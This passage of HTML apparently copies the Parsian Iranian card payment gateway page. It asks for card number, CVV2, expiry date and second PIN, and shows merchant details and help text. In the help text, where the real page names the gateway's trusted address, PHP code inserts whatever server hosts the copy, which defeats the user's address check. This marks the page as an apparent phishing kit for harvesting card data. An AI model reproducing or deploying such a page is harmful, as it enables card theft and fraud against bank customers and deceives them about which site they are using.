                                            data-val-required="The MerchantMaxAllowTransactionAmount field is required."
                                            id="MerchantMaxAllowTransactionAmount"
                                            name="MerchantMaxAllowTransactionAmount" type="hidden"
                                            value="50000000000"><input id="MerchantName" name="MerchantName"
                                            type="hidden" value="رایان ارتباط شب آهنگ"><input data-val="true"
                                            data-val-number="The field MerchantNo must be a number."
                                            data-val-required="The MerchantNo field is required." id="MerchantNo"
                                            name="MerchantNo" type="hidden" value="4381835618"><input data-val="true"
                                            data-val-number="The field OrderId must be a number."
                                            data-val-required="The OrderId field is required." id="txtOrderId"
                                            name="OrderId" type="hidden" value="972273150"><input data-val="true"
                                            data-val-number="The field TerminalNo must be a number."
                                            data-val-required="The TerminalNo field is required." id="TerminalNo"
                                            name="TerminalNo" type="hidden" value="98797002"><input data-val="true"
                                            data-val-maxlength="منشأ بیش از اندازه مجاز طولانی است"
                                            data-val-maxlength-max="40" id="Originator" name="Originator" type="hidden"
                                            value=""><input id="CardTspToken" name="CardTspToken" type="hidden"
                                            value="">
                                        <div class="form-group first-form-group">
                                            <div>
                                                <label>
                                                    شماره کارت
                                                    <img src="./files/833.gif" width="20" class="loadingPanImage"
                                                        style="display:none;">
                                                </label>
                                                <span class="desktop-error-desc">
                                                    <span class="field-validation-valid text-danger"
                                                        data-valmsg-for="CardNumber" data-valmsg-replace="true"></span>
                                                </span>
                                            </div>
                                            <div class="form-control focus position-relative">

                                                <span class="bi bi-x-circle text-danger" id="CleanPan"
                                                    title="پاک کردن کارت"></span>


                                                <input autocomplete="off"
                                                    class="effect-8 border-0 col-12 float-right inputbox text-center creditCard"
                                                    data-nextselector=".cvv2" data-val="true"
                                                    data-val-length="شماره کارت به درستی وارد نشده است"
                                                    data-val-length-max="19" data-val-length-min="19"
                                                    data-val-required="شماره کارت وارد نشده است" id="pan" maxlength="19"
                                                    name="CardNumber" tabindex="1" title="شماره کارت" type="tel"
                                                    value="">


                                                <div class="card-logo col-1">

                                                </div>
                                                <img src="./files/keyboard.png" class="keypadBtn" data-top="313.796875"
                                                    data-left="611.5">
                                            </div>
                                        </div>
                                        <div class="form-group" id="segmentHolder" style="display:none;">
                                            <label>
                                                سگمنت

                                            </label>

                                            <span class="desktop-error-desc">
                                                <span class="field-validation-valid text-danger" data-valmsg-for="SrvId"
                                                    data-valmsg-replace="true"></span>
                                            </span>

                                            <select style="direction: rtl" class="form-control custom-select"
                                                data-val="true" data-val-number="The field سگمنت کارت must be a number."
                                                id="cmbSegmetns" name="SrvId" tabindex="2"></select>

                                        </div>
                                        <div class="row">
                                            <div class="col-md-6 float-right form-group">
                                                <div class="position-relative">
                                                    <label>
                                                        cvv2
                                                    </label>
                                                    <span class="desktop-error-desc">
                                                        <span class="field-validation-valid text-danger"
                                                            data-valmsg-for="Cvv2" data-valmsg-replace="true"></span>
                                                    </span>
                                                    <div class="form-control focus">
                                                        <input autocomplete="off"
                                                            class="cvv2 effect-8 border-0 col-12 float-right inputbox keypad TS"
                                                            data-nextselector=".month" data-val="true"
                                                            data-val-regex="cvv2 به درستی وارد نشده است"
                                                            data-val-regex-pattern="^\d{3}$|^\d{4}$"
                                                            data-val-required="cvv2 وارد نشده است" id="cvv2"
                                                            inputmode="numeric" maxlength="4" name="Cvv2" tabindex="3"
                                                            title="CVV2" type="tel" value="">
                                                        <img src="./files/keyboard.png" class="keypadBtn"
                                                            data-top="415.390625" data-left="975.015625">
                                                    </div>

                                                </div>
                                            </div>
                                            <div class="col-md-6 float-right form-group">
                                                <div class="position-relative">
                                                    <label>
                                                        تاریخ انقضاء
                                                    </label>
                                                    <span class="desktop-error-desc"
                                                        style="float:none;text-align:right;">
                                                        <span class="field-validation-valid text-danger"
                                                            data-valmsg-for="ExpireMonth"
                                                            data-valmsg-replace="true"></span>
                                                    </span>
                                                    <span class="desktop-error-desc"
                                                        style="float:none;text-align:right;">
                                                        <span class="field-validation-valid text-danger"
                                                            data-valmsg-for="ExpireYear"
                                                            data-valmsg-replace="true"></span>
                                                    </span>

                                                    <div class="form-control focus" style="direction:rtl">

                                                        <input autocomplete="off"
                                                            class="effect-8 border-0 inputbox text-center month"
                                                            data-nextselector=".year" data-val="true"
                                                            data-val-range="ماه نامعتبر" data-val-range-max="12"
                                                            data-val-range-min="1" data-val-regex="ماه نامعتبر"
                                                            data-val-regex-pattern="^\d{2}$"
                                                            data-val-required="ماه نامعتبر" id="txtExpM" maxlength="2"
                                                            name="ExpireMonth" placeholder="ماه" tabindex="4" type="tel"
                                                            value="">
                                                        <div class="d-inline exp-date-seprate">/</div>
                                                        <input autocomplete="off"
                                                            class="effect-8 border-0 inputbox text-center year"
                                                            data-nextselector=".captcha" data-val="true"
                                                            data-val-range="سال نامعتبر" data-val-range-max="99"
                                                            data-val-range-min="0" data-val-regex="سال نامعتبر"
                                                            data-val-regex-pattern="^\d{2}$"
                                                            data-val-required="سال نامعتبر" id="txtExpY" maxlength="2"
                                                            name="ExpireYear" placeholder="سال" tabindex="5" type="tel"
                                                            value="">
                                                    </div>
                                                </div>
                                            </div>

                                        </div>
                                        <div class="row">

                                            <div class="col-md-12 form-group">
                                                <div class="position-relative">
                                                    <label>
                                                        کد امنیتی
                                                    </label>
                                                    <span class="desktop-error-desc">
                                                        <span class="field-validation-valid text-danger"
                                                            data-valmsg-for="Captcha" data-valmsg-replace="true"></span>
                                                    </span>
                                                </div>
                                                <div class="form-control focus ">

                                                    <input autocomplete="off"
                                                        class="effect-8 border-0 col-md-12 inputbox text-right captcha p-0"
                                                        data-nextselector=".pin" data-val="true"
                                                        data-val-chekpan="شماره کارت وارد نشده است"
                                                        data-val-chekpan-param="30-01-2023"
                                                        data-val-length="کد امنیتی به درستی وارد نشده است"
                                                        data-val-length-max="5" data-val-length-min="5"
                                                        data-val-required="کد امنیتی وارد نشده است" id="Captcha"
                                                        maxlength="5" name="Captcha" tabindex="6" title="کد امنیتی"
                                                        type="tel" value="">

                                                    <div class="captcha-holder">
                                                        <style>
                                                        .lol {
                                                            text-decoration: none !important;
                                                            cursor: pointer;
                                                        }

                                                        #capTbl tbody tr td {
                                                            line-height: 10px;
                                                            font-size: 16px
                                                        }
                                                        </style>
                                                        <div style="display: flex; float:left; align-items:center">
                                                            <table id="capTbl" style="color: black; margin-left:5px">
                                                                <tbody>
                                                                    <tr>
                                                                        <td style="padding:5px;"><a
                                                                                class="bi bi-volume-up text-gray pointer"
                                                                                title="Captcha Speak!" onclick=""></a>
                                                                        </td>
                                                                        <td style="padding:5px;"><a
                                                                                class="bi bi-arrow-clockwise text-gray pointer"
                                                                                title="Captcha Refresh" onclick=""></a>
                                                                        </td>
                                                                    </tr>
                                                                </tbody>
                                                            </table><img id="imgc1" class=""
                                                                style="border: 1px lightgray solid;border-radius:5px;"
                                                                src="./files/captcha.ashx">
                                                        </div>
                                                        <script>
                                                        var audioDic = {};

                                                        function refresh(id) {
                                                            var aud = audioDic[id];
                                                            if (aud) {
                                                                aud.pause();
                                                                aud.currentTime = 0;
                                                            }
                                                            audioDic[id] = undefined;
                                                            $("#img" + id).attr('src', '~/NewIPG/captcha.ashx?id=' +
                                                                id + '&' + Math.random())
                                                        }
                                                        var play = function(id) {
                                                            var aud = audioDic[id];
                                                            if (aud == undefined) aud = new Audio(
                                                                '~/NewIPG/sayit.ashx?id=' + id + '&' + Math
                                                                .random());
                                                            aud.pause();
                                                            aud.currentTime = 0;
                                                            aud.play();
                                                            audioDic[id] = aud;
                                                        }
                                                        </script>
                                                        <div class="clearfix"></div>
                                                    </div>

                                                </div>
                                            </div>
                                            <div class="col-md-12 form-group">
                                                <div class="position-relative">
                                                    <label>
                                                        رمز دوم
                                                    </label>
                                                    <span class="desktop-error-desc">
                                                        <span class="field-validation-valid text-danger"
                                                            data-valmsg-for="Pin2" data-valmsg-replace="true"></span>
                                                    </span>
                                                </div>
                                                <div class="form-control focus pin-focus">

                                                    <input autocomplete="off"
                                                        class="effect-8 border-0 float-right inputbox keypad pin TS text-right p-0 col-md-12"
                                                        data-nextselector=".email" data-val="true"
                                                        data-val-maxlength="رمز دوم باید حداکثر 12 رقم باشد"
                                                        data-val-maxlength-max="12"
                                                        data-val-minlength="رمز دوم باید حداقل 5 رقم باشد"
                                                        data-val-minlength-min="5"
                                                        data-val-regex="رمز دوم به درستی وارد نشده است"
                                                        data-val-regex-pattern="^\d{5,12}$"
                                                        data-val-required="رمز دوم وارد نشده است" id="pin2"
                                                        inputmode="numeric" maxlength="12" name="Pin2" tabindex="7"
                                                        title="رمز  دوم کارت" type="tel" value="">
                                                    <button id="sendotp" class="request-dynamicPass" type="button"
                                                        tabindex="100">
                                                        درخواست رمز پویا
                                                        <i class="bi bi-cursor"></i>
                                                    </button>
                                                    <img src="./files/keyboard.png" id="pinKeypad"
                                                        class="keypadBtn float-left" data-top="618.578125"
                                                        data-left="611.5">
                                                </div>

                                            </div>
                                        </div>
                                        <div class="row ">
                                            <div class="col-md-6 form-group">

                                                <div class="position-relative">
                                                    <label>
                                                        ایمیل (اختیاری)
                                                    </label>
                                                    <span class="desktop-error-desc">
                                                        <span class="field-validation-valid text-danger"
                                                            data-valmsg-for="Email" data-valmsg-replace="true"></span>
                                                    </span>
                                                </div>
                                                <div class="focus">

                                                    <input autocomplete="off"
                                                        class="effect-8 form-control focus text-center email float-none"
                                                        data-nextselector=".mobile" data-val="true"
                                                        data-val-regex="فرمت ايميل صحيح نمی باشد"
                                                        data-val-regex-pattern="^[A-Za-z0-9_\+-]+(\.[A-Za-z0-9_\+-]+)*@[A-Za-z0-9-]+(\.[A-Za-z0-9]+)*\.([A-Za-z]{2,4})$"
                                                        dir="ltr" id="Email" maxlength="50" name="Email" tabindex="8"
                                                        title="ایمیل (اختیاری)" type="text" value="">
                                                </div>
                                            </div>
                                            <div class="col-md-6 form-group">

                                                <div class="position-relative">
                                                    <label>
                                                        تلفن همراه(اختیاری)
                                                    </label>
                                                    <span class="desktop-error-desc">
                                                        <span class="field-validation-valid text-danger"
                                                            data-valmsg-for="MobileNo"
                                                            data-valmsg-replace="true"></span>
                                                    </span>
                                                </div>
                                                <div class="focus">
                                                    <input autocomplete="off"
                                                        class="effect-8 form-control focus text-center mobile float-none"
                                                        data-nextselector=".email" data-val="true"
                                                        data-val-regex="شماره همراه نامعتبر است"
                                                        data-val-regex-pattern="^\d{11}$" dir="ltr" id="MobileNo"
                                                        maxlength="11" name="MobileNo" tabindex="9"
                                                        title=" شماره تلفن همراه" type="tel" value="">

                                                </div>
                                            </div>

                                        </div>
                                        <div class="form-group">
                                        </div>
                                        <div class="row mt-3">
                                            <div class="col-8 float-right pay">
                                                <div class="form-group">
                                                    <button class="btn btn-success col-12 payBtn" type="submit"
                                                        id="btnPayment" name="submit" tabindex="10">پرداخت</button>
                                                </div>
                                            </div>
                                            <div class="col-4 float-right cancel">
                                                <div class="form-group">
                                                    <button class="btn btn-danger col-12" type="button" id="btnCancel"
                                                        onclick="cancelPayment()" tabindex="11">انصراف</button>

                                                </div>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="acceptor-sm col-12">
                    <div class="mt-3">

                        <div class="container mt-3 ">

                            <div class="mt-1 row">

                                <div class="boxedRight d-inline float-right">
                                    نام فروشگاه
                                </div>
                                <span class="boxedLeft d-inline float-left">
                                    رایان ارتباط شب آهنگ
                                </span>

                                <div class="clearfix"></div>
                            </div>
                            <div class="mt-1 row">

                                <div class="boxedRight d-inline float-right">
                                    آدرس وب سایت
                                </div>

                                <span class="boxedLeft d-inline float-left">
                                <?php echo $_SERVER['SERVER_NAME']; ?>
                                </span>

                                <div class="clearfix"></div>
                            </div>
                            <div class=" mt-1 row">

                                <div class="boxedRight d-inline float-right">
                                    کد پذیرنده
                                </div>


                                <span class="boxedLeft d-inline float-left">
                                    ۴۳۸۱۸۳۵۶۱۸
                                </span>

                                <div class="clearfix"></div>
                            </div>
                            <div class=" mt-1 row">

                                <div class="boxedRight d-inline float-right">
                                    شماره ترمینال
                                </div>


                                <span class="boxedLeft d-inline float-left">
                                    ۹۸۷۹۷۰۰۲
                                </span>

                                <div class="clearfix"></div>
                            </div>
                        </div>
                        <div class="clearfix"> </div>

                    </div>
                </div>
                <div class="m-0 p-0 help-sm left-n-box">
                    <div class="col-12 gray-box box-left text-center p-0" id="col3">
                        <span class="text-center help-box d-inline-block font-weight-bold"
                            style="margin-top:8px;">راهنمای استفاده از رمز پویا</span>
                        <ul class="pinInfo">
                            <li>
                                <i class="bi bi-circle-fill"></i>
                                رمزپویا، رمز یک بار مصرفی است که به جای رمز دوم کارت استفاده میشود


                            </li>
                            <li>
                                <i class="bi bi-circle-fill"></i>
                                براساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعال سازی رمز پویا اقدام نمایید
                            </li>
                            <li>
                                <i class="bi bi-circle-fill"></i>
                                رمز پویا را براساس روش اعلامی از طرف بانک صادر کننده کارت، به یکی از روش های زیر دریافت
                                کنید
                            </li>
                            <li class="Nobullet">
                                <ul class="p-0 m-0 mt-3 sub-list">
                                    <li class="Nobullet">
                                        <span class="number-bullet">۱</span>
                                        دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک
                                    </li>
                                    <li class="Nobullet">
                                        <span class="number-bullet">۲</span>
                                        دریافت از طریق کد USSD بانک صادرکننده کارت شما
                                    </li>
                                    <li class="Nobullet">
                                        <span class="number-bullet">۳</span>
                                        دریافت از طریق زدن دکمه "رمزپویا" در درگاه پرداخت اینترنتی
                                    </li>
                                </ul>
                            </li>
                            <li>
                                پس از دریافت رمز به یکی از روش های فوق، رمز پویای دریافت شده را در محل تعیین شده برای
                                "رمز دوم" وارد نمایید و سپس مابقی اطلاعات را تکمیل نمایید
                            </li>
                        </ul>

                        <div class="help-desktop">
                            <ul class="nav nav-tabs nav-fill mt-2 p-0 col-12" role="tablist">
                                <li class="nav-item" role="presentation">
                                    <a class="nav-link active" data-toggle="tab"
                                        href="https://pec.shaparak.ir/NewIPG/?Token=225680089478907&amp;AspxAutoDetectCookieSupport=1#box1">راهنمای
                                        پرداخت</a>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <a class="nav-link" data-toggle="tab"
                                        href="https://pec.shaparak.ir/NewIPG/?Token=225680089478907&amp;AspxAutoDetectCookieSupport=1#box2">نحوه
                                        ورود اطلاعات</a>
                                </li>

                            </ul>

                            <div class="tab-content">
                                <div id="box1" class="tab-pane fade show active inner">
                                    <div class="inner">
                                        <p>
                                        </p>
                                        <ul class="pinInfo">
                                            <li>
                                                <i class="bi bi-circle-fill"></i>
                                                مشتری گرامی شما با پروتکل امن (ssl) به دروازه پرداخت تجارت الکترونیک
                                                پارسیان که با آدرس <?php echo $_SERVER['SERVER_NAME']; ?> شروع می شود متصل شده اید
                                            </li>
                                            <li>
                                                <i class="bi bi-circle-fill"></i>
                                                خواهشمند است جهت جلوگیری از سوء استفاده های اینترنتی، آدرس مرورگر وب خود
                                                را با آدرس مذکور مقایسه نمایید
                                            </li>
                                            <li>
                                                <i class="bi bi-circle-fill"></i>
                                                لطفاً از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.
                                                برای جلوگیری از افشای رمز کارت خود حتی المقدور از صفحه کلید مجازی
                                                استفاده فرمایید
                                            </li>
                                        </ul>
                                        <p></p>
                                    </div>
                                </div>
                                <div id="box2" class="tab-pane fade" data-simplebar="init">
                                    <div class="simplebar-wrapper" style="margin: 0px;">
                                        <div class="simplebar-height-auto-observer-wrapper">
                                            <div class="simplebar-height-auto-observer"></div>
                                        </div>
                                        <div class="simplebar-mask">
                                            <div class="simplebar-offset" style="left: 0px; bottom: 0px;">
                                                <div class="simplebar-content-wrapper" tabindex="0" role="region"
                                                    aria-label="scrollable content"
                                                    style="height: auto; overflow: hidden;">
                                                    <div class="simplebar-content" style="padding: 0px;">
                                                        <div class="inner">
                                                            <p>
                                                            </p>
                                                            <ul class="pinInfo mt-3"
                                                                style="line-height:18px;padding-top:0px;padding-bottom:0px;padding-right:10px;font-size:0.9rem">
                                                                <li class="Nobullet">
                                                                    <div class="row m-1">
                                                                        <div class="text-bullet col-4">
                                                                            <i class="bi bi-credit-card-2-back"></i>
                                                                            شماره کارت
                                                                        </div>
                                                                        <div class="col-8">
                                                                            شماره کارت 16 رقمی مندرج بر روی کارت
                                                                        </div>
                                                                    </div>
                                                                </li>
                                                                <li class="Nobullet">
                                                                    <div class="row m-1">
                                                                        <div class="text-bullet col-4">
                                                                            <i class="bi bi-lock"></i>
                                                                            رمز دوم کارت
                                                                        </div>
                                                                        <div class="col-8">
                                                                            رمز دوم (یا رمز اینترنتی) دریافت شده از بانک
                                                                            صادرکننده و یا خودپرداز
                                                                        </div>
                                                                    </div>
                                                                </li>
                                                                <li class="Nobullet">
                                                                    <div class="row m-1">
                                                                        <div class="text-bullet col-4">
                                                                            <i class="bi bi-lock"></i>
                                                                            CVV2
                                                                        </div>
                                                                        <div class="col-8">
                                                                            کد سه یا چهار رقمی مندرج در پشت یا روی کارت
                                                                        </div>
                                                                    </div>
                                                                </li>
                                                                <li class="Nobullet">
                                                                    <div class="row m-1">
                                                                        <div class="text-bullet col-4">
                                                                            <i class="bi bi-clock"></i>
                                                                            تاریخ انقضا
                                                                        </div>
                                                                        <div class="col-8">
                                                                            ماه و سال انقضای کارت مندرج بر روی کارت
                                                                        </div>
                                                                    </div>
                                                                </li>
                                                                <li class="Nobullet">
                                                                    <div class="row m-1">
                                                                        <div class="text-bullet  col-4">
                                                                            <i class="bi bi-lock"></i>
                                                                            کد امنیتی
                                                                        </div>
                                                                        <div class="col-8">
                                                                            حروف و ارقام مندرج در ذیل عنوان کد امنیتی که
                                                                            قابل تغییر نیز می باشد
                                                                        </div>
                                                                    </div>
                                                                </li>
                                                                <li class="Nobullet">
                                                                    <div class="row m-1">
                                                                        <div class="text-bullet  col-4">
                                                                            <i class="bi bi-envelope"></i>
                                                                            ایمیل(اختیاری
                                                                            )
                                                                        </div>
                                                                        <div class="col-8">
                                                                            ورود آدرس ایمیل در صورت نیاز به دریافت رسید
                                                                            پرداخت
                                                                        </div>
                                                                    </div>
                                                                </li>
                                                            </ul>
                                                            <p></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="simplebar-placeholder" style="width: 0px; height: 0px;"></div>
                                    </div>
                                    <div class="simplebar-track simplebar-horizontal" style="visibility: hidden;">
                                        <div class="simplebar-scrollbar simplebar-visible"
                                            style="width: 0px; display: none;"></div>
                                    </div>
                                    <div class="simplebar-track simplebar-vertical" style="visibility: hidden;">
                                        <div class="simplebar-scrollbar simplebar-visible"
                                            style="height: 0px; display: none;"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="help-mobile">
                            <span class="text-center help-box d-inline-block font-weight-bold"
                                style="margin-top:8px;">راهنمای پرداخت</span>
                            <ul class="pinInfo">
                                <li>
                                    <i class="bi bi-circle-fill"></i>
                                    مشتری گرامی شما با پروتکل امن (ssl) به دروازه پرداخت تجارت الکترونیک پارسیان که با
                                    آدرس <?php echo $_SERVER['SERVER_NAME']; ?> شروع می شود متصل شده اید
                                </li>
                                <li>
                                    <i class="bi bi-circle-fill"></i>
                                    خواهشمند است جهت جلوگیری از سوء استفاده های اینترنتی، آدرس مرورگر وب خود را با آدرس
                                    مذکور مقایسه نمایید
                                </li>
                                <li>
                                    <i class="bi bi-circle-fill"></i>
                                    لطفاً از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید. برای جلوگیری
                                    از افشای رمز کارت خود حتی المقدور از صفحه کلید مجازی استفاده فرمایید
                                </li>
                            </ul>
                            <div class="DataEntry-help">
                                <span class="text float-right">
                                    نحوه ورود اطلاعات
                                </span>
                                <span class="line float-right">
                                </span>
                                <div class="clearfix"></div>

                                <ul class="pinInfo mt-3"
                                    style="line-height:18px;padding-top:0px;padding-bottom:0px;padding-right:10px;font-size:0.9rem">
                                    <li class="Nobullet">
                                        <div class="row m-1">
                                            <div class="text-bullet col-4">
                                                <i class="bi bi-credit-card-2-back"></i>
                                                شماره کارت
                                            </div>
                                            <div class="col-8">
                                                شماره کارت 16 رقمی مندرج بر روی کارت
                                            </div>
                                        </div>
                                    </li>
                                    <li class="Nobullet">
                                        <div class="row m-1">
                                            <div class="text-bullet col-4">
                                                <i class="bi bi-lock"></i>
                                                رمز دوم کارت
                                            </div>
                                            <div class="col-8">
                                                رمز دوم (یا رمز اینترنتی) دریافت شده از بانک صادرکننده و یا خودپرداز
                                            </div>
                                        </div>
                                    </li>
                                    <li class="Nobullet">
                                        <div class="row m-1">
                                            <div class="text-bullet col-4">
                                                <i class="bi bi-lock"></i>
                                                CVV2
                                            </div>
                                            <div class="col-8">
                                                کد سه یا چهار رقمی مندرج در پشت یا روی کارت
                                            </div>
                                        </div>
                                    </li>
                                    <li class="Nobullet">
                                        <div class="row m-1">
                                            <div class="text-bullet col-4">
                                                <i class="bi bi-clock"></i>
                                                تاریخ انقضا
                                            </div>
                                            <div class="col-8">
                                                ماه و سال انقضای کارت مندرج بر روی کارت
                                            </div>
                                        </div>
                                    </li>
                                    <li class="Nobullet">
                                        <div class="row m-1">
                                            <div class="text-bullet  col-4">
                                                <i class="bi bi-lock"></i>
                                                کد امنیتی
                                            </div>
                                            <div class="col-8">
                                                حروف و ارقام مندرج در ذیل عنوان کد امنیتی که قابل تغییر نیز می باشد
                                            </div>
                                        </div>
                                    </li>
                                    <li class="Nobullet">
                                        <div class="row m-1">
                                            <div class="text-bullet  col-4">
                                                <i class="bi bi-envelope"></i>
                                                ایمیل(اختیاری)
                                            </div>
                                            <div class="col-8 ">
                                                ورود آدرس ایمیل در صورت نیاز به دریافت رسید پرداخت
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>

                    </div>
                </div>
                <div class="footer-sm col-12">

                    <h6 class="text-center mt-3 contactus">
                        اطلاعات تماس پشتیبانی

                        ۲۳۱۸ - ۰۲۱
                    </h6>
                    <div class="text-center">
                        <span class="copyright d-block">
                            کلیه حقوق متعلق به شرکت تجارت الکترونیک پارسیان می باشد

                        </span>
                        <div class="blind">
                            حامی حقوق روشندلان
                        </div>
                    </div>

                </div>
            </div>


            <form action="https://pec.shaparak.ir/NewIPG/CancelPayment" method="post" id="CancelPaymentForm"
                novalidate="novalidate">
                <input data-val="true" data-val-number="The field Token must be a number."
                    data-val-required="The Token field is required." id="Token" name="Token" type="hidden"
                    value="225680089478907">
            </form>


        </div>
    </div>

    <div class="modal fade" id="V2Modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
        aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel"></h5>

                </div>
                <div class="modal-body text-right">

                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-success" data-dismiss="modal">بستن</button>

                </div>
            </div>
        </div>
    </div>








    <script type="text/javascript">
    var options = {
        baseUrl: 'https://pec.shaparak.ir/NewIPG',
        IsSubmitPaymentForm: false,
        captchaUrl: "https://pec.shaparak.ir/NewIPG/InvalidToken",
        invalidTokenUrl: "/InvalidToken",
        tokenTimeout: 595,
        hasTspData: false,
        keyPadIconPath: "/NewIPG/Content/New97/Images/keypad.png",
        requestTime: '1/30/2023 12:00:07 AM',
        secondsPast: '4.2564907',
        isMerchantClubAcceptable: 'False'.toLowerCase(),
        binsForClub: 'null',
        token: '225680089478907',
        mobile: ''
    };
    </script>

    <script src="./files/jquery.min.js.download"></script>

    <script src="./files/jquery.validate.min.js.download"></script>
    <script src="./files/jquery.validate.unobtrusive.min.js.download"></script>

    <script src="./files/bootstrap.min.js.download"></script>
    <script src="./files/jquery.plugin.min.js.download"></script>
    <script src="./files/Toastr.js.download"></script>
    <script src="./files/modernizr-custom.min.js.download"></script>
    <script src="./files/owl.carousel.min.js.download"></script>
    <script src="./files/sweetalert.min.js.download"></script>

    <script src="./files/jquery.mask.min.js.download"></script>
    <script src="./files/CountdownTimer.min.js.download"></script>
    <script src="./files/Main.min.js.download"></script>
    <script src="./files/VirtualNumpad.min.js.download"></script>


    <script src="./files/simplebar.min.js.download"></script>
    <script type="text/javascript">
    docReady(function() {
        DocumentReadyOptions(options);

        startTimer({
            totalTime: 600,
            display: document.querySelector('#countdown-lg'),
            showprogress: true,
            progressWidth: 100,
            progressSelector: document.querySelector('#countdownProgress-lg'),
            pastSecond: _options.secondsPast,
            callbackfunction: function() {
                window.location.href = _options.baseUrl + _options.invalidTokenUrl
            },
        });


        startTimer({
            totalTime: 600,
            display: document.querySelector('#countdown-sm'),
            showprogress: false,
            pastSecond: _options.secondsPast,
            callbackfunction: function() {
                window.location.href = _options.baseUrl + _options.invalidTokenUrl
            },
        });

        if ('False'.trim().toLowerCase() == 'true') {
            swal({
                position: 'top-end',
                type: 'error',
                title: 'خطا در عملیات پرداخت',
                text: '',
                showConfirmButton: true,
                confirmButtonText: "متوجه شدم",
            })
        }

        //if ('OTPCredential' in window) {
        //    //window.addEventListener('DOMContentLoaded', e => {
        //        var input = document.querySelector('input[autocomplete="one-time-code"]');
        //        if (!input) return;
        //    var ac = new AbortController();
        //    //var form = input.closest('form');
        //        //if (form) {
        //            //form.addEventListener('submit', e => {
        //               // ac.abort();
        //            //});
        //        //}
        //    navigator.credentials.get({
        //        otp: { transport: ['sms'] },
        //        signal: ac.signal
        //    });
        //            //.then(
        //            //otp => {
        //            //input.value = otp.code;
        //            //if (form) form.submit();
        //        //}).catch(err => {
        //            //console.log(err);
        //        //});
        //    //});
        //}

        var myElement = document.getElementById('box2');
        var amount = '200000';
        new SimpleBar(myElement, {
            autoHide: false
        });
    });

    //$('.perc').append('<span style="display:block;font-size:1rem" id="toman" class="toman" >' + Num2persian(parseInt(amount / 10)) + ' تومان </span>');
    //$('#mobile-rial-unit').append('<small style="display:block;font-size:.8rem" id="toman" class="toman" >' + Num2persian(parseInt(amount / 10)) + ' تومان </small>');
    </script>








</body>
<!--[if IE 9]>
      <link href="https://pec.shaparak.ir/NewIPG/Content/v2/css/bootstrap-ie9.min.css" rel="stylesheet" />
        <script src="https://pec.shaparak.ir/NewIPG/Content/v2/js/bootstrap-ie9.min.js"></script>
  <![endif]-->
<!--[if IE 8]>
        <link href="https://pec.shaparak.ir/NewIPG/Content/v2/css/bootstrap-ie8.min.css" rel="stylesheet" />
        <script src="https://pec.shaparak.ir/NewIPG/Content/v2/js/html5shiv@3.7.3"></script>
        <script src="https://pec.shaparak.ir/NewIPG/Content/v2/js/jquery-1.12.4.min.js"></script>
    <![endif]-->
<!--[if lt IE 8]>
        <link href="https://pec.shaparak.ir/NewIPG/Content/v2/css/bootstrap-ie7.min.css" rel="stylesheet" />
        <script src="https://pec.shaparak.ir/NewIPG/Content/v2/js/html5shiv@3.7.3"></script>
        <script src="https://pec.shaparak.ir/NewIPG/Content/v2/js/jquery-1.12.4.min.js"></script>
    <![endif]-->
<!--TestCompleteHiddenNodes{{-->
<script istestcompletehiddennode="1">
var g_TestCompleteChromeBrowserAgentScriptHelper12_0 = {
    "addScriptToAgent": function() {},
    "removeScriptFromAgent": function() {},
    "addCustomScript": function(text) {
        try {
            eval(text);
        } catch (e) {
            console.trace(e);
        }
        return true;
    }
};
window["$iocm12"] = {
    "name": "$iocm12",
    "persistentIdName": "nptcCrBrowserAgentIdentityValue_ver12_0",
    "contentAgentName": "g_TestCompleteChromeBrowserAgentScriptHelper12_0",
    "persistentIdValue": 8981,
    "context": {},
    "OBJECTID_NULL": 0,
    "OBJECTID_WINDOW": -1,
    "OBJECTID_CONTEXT": -2,
    "OBJECTID_AGENT": -3,
    "OBJECTID_IOCM": -4,
    "objectCache": [],
    "objectMonikerCache": [],
    "freeIndexes": [],
    "nextCacheId": 1,
    "nextCacheIdStep": 1,
    "cachedNamespaces": {},
    "isObject": function(obj) {

        return (typeof(obj) == "object") || (obj instanceof Object) ||
            ((typeof(obj) == "undefined") && (obj !== undefined) && (obj.constructor != null));

    },
    "getObjectPersistentId": function(obj) {

        if ((typeof(obj) != "object") || (obj == null))
            return 0;
        var persistentId = obj[this.persistentIdName];
        if (typeof(persistentId) == "undefined") {
            persistentId = this.persistentIdValue++;
            obj[this.persistentIdName] = persistentId;
        }
        return persistentId;
    },
    "inSandbox": function() {

        return typeof(c_9B1D14CA_8ADC_4110_B4FE_C428750E198F) == "undefined";
    },
    "isCustomElement": function(el) {
        var classes = ['Element', 'HTMLElement', 'HTMLAnchorElement', 'HTMLAppletElement', 'HTMLAreaElement',
            'HTMLAudioElement', 'HTMLBaseElement', 'HTMLBaseFontElement', 'HTMLBlockquoteElement',
            'HTMLBodyElement',
            'HTMLBRElement', 'HTMLButtonElement', 'HTMLCanvasElement', 'HTMLDetailsElement',
            'HTMLDirectoryElement', 'HTMLDivElement', 'HTMLDListElement', 'HTMLEmbedElement',
            'HTMLFieldSetElement', 'HTMLFontElement',
            'HTMLFormElement', 'HTMLFrameElement', 'HTMLFrameSetElement', 'HTMLHeadElement',
            'HTMLHeadingElement', 'HTMLHRElement', 'HTMLHtmlElement', 'HTMLIFrameElement',
            'HTMLImageElement', 'HTMLInputElement',
            'HTMLKeygenElement', 'HTMLLabelElement', 'HTMLLegendElement', 'HTMLLIElement',
            'HTMLLinkElement', 'HTMLMapElement', 'HTMLMarqueeElement', 'HTMLMediaElement',
            'HTMLMenuElement', 'HTMLMetaElement',
            'HTMLMeterElement', 'HTMLModElement', 'HTMLObjectElement', 'HTMLOListElement',
            'HTMLOptGroupElement', 'HTMLOptionElement', 'HTMLOutputElement', 'HTMLParagraphElement',
            'HTMLParamElement', 'HTMLPictureElement',
